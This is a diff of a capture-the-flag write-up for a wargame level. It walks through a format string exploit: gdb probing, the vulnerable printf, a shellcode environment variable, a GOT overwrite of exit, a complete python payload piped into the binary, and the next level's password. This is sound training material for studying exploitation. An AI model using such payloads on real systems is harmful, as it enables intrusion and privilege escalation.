@@ -9,17 +9,17 @@ We've opened the binary with gdb and running the 'info functions' command we've 
 We've started to test to see if a Format String Vulnerability was present.
 
 We've tested with multiple inputs:
-	- %p %p %p %p: printed some address
-	- %s: Segmentation fault (core dumped)
+    - %p %p %p %p: printed some address
+    - %s: Segmentation fault (core dumped)
 
 With this tests we've undestood that in the code there was something like this:
 
 int main()
 {
-	char s[100];
-	fgets(s, 100, stdin);
-	printf(s); <-- vulnerable printf
-	exit (0);
+    char s[100];
+    fgets(s, 100, stdin);
+    printf(s); <-- vulnerable printf
+    exit (0);
 }
 
 2. Format String Exploit
@@ -30,13 +30,13 @@ from the Global Offset Table. In our program we choosed to inject the shellcode 
 since is the only funciton that we have after the printf.
 
 To do a FSE we need:
-	- Shellcode to export as a variable in the env that execute a /bin/sh.
-	- Find the address of the exported variable using gdb during program execution and the address
-	  of the exit on the GOT.
-	- Find the position on the Stack relative to our printf to understand where to write the address of
-	  the env variable.
-	- Build a payload to overwrite the exit address with the shellcode env var address.
-	- Write the shellcode at the address using python and the payload.
+    - Shellcode to export as a variable in the env that execute a /bin/sh.
+    - Find the address of the exported variable using gdb during program execution and the address
+      of the exit on the GOT.
+    - Find the position on the Stack relative to our printf to understand where to write the address of
+      the env variable.
+    - Build a payload to overwrite the exit address with the shellcode env var address.
+    - Write the shellcode at the address using python and the payload.
 
 We found online a bytecode that execute a /bin/sh (shellcode):
 
@@ -124,21 +124,21 @@ Now we can build our exploit:
 
 \xe2\x97\x04\x08
 
-It'll be: \xe0\x97\x04\x08 \xe2\x97\x04\x08 %55490x %10$hn %10037x %11$hn
+It'll be: \xe0\x97\x04\x08 \xe2\x97\x04\x08 %55490x %10$n %10037x %11$n
 
 - \xe0\x97\x04\x08 or 0x080497e0 (in reverse order) points to the low order bytes.
 - \xe2\x97\x04\x08 or 0x080497e2 (in reverse order) points to the high order bytes.
 - %55490× will write 55490 bytes on the standard output.
-- %10$hn will write 8 + 55490 = 55498 bytes (or 0xd8ca) at the first address specified (0x080497e0).
+- %10$n will write 8 + 55490 = 55498 bytes (or 0xd8ca) at the first address specified (0x080497e0).
 - %10037x will write 10037 bytes on the standard output.
-- %11$hn will write 8 + 55490 + 10037 = 65535 (or 0xffff) at the second address specified (0x080497e2).
+- %11$n will write 8 + 55490 + 10037 = 65535 (or 0xffff) at the second address specified (0x080497e2).
 
 Now as usual:
 
 python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55490x' + '%10\$n' + '%10037x' + '%11\$n'" > /tmp/exploit
 
                                                                            ^                      ^
-																	We need to escape the two $ for the shell.
+                                                                    We need to escape the two $ for the shell.
 
 cat /tmp/exploit - | ./level05
 
@@ -149,3 +149,5 @@ level06
 
 cat ~level06/.pass                
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+Victory!
